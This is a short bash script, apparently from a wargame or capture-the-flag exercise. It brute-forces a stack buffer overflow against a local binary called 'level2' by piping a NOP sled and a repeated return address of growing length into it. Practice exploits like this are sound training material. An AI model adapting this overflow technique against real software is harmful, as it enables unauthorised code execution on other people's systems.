#!/bin/bash

for ((i=0; i<=140; i++)); do
    payload=$(python -c "print(b'\x90'*$i + b'\x4a\x85\x04\xb8' * 4)")
    echo "Trying payload length: $i"
    echo -ne "$payload" | ~/level2
done

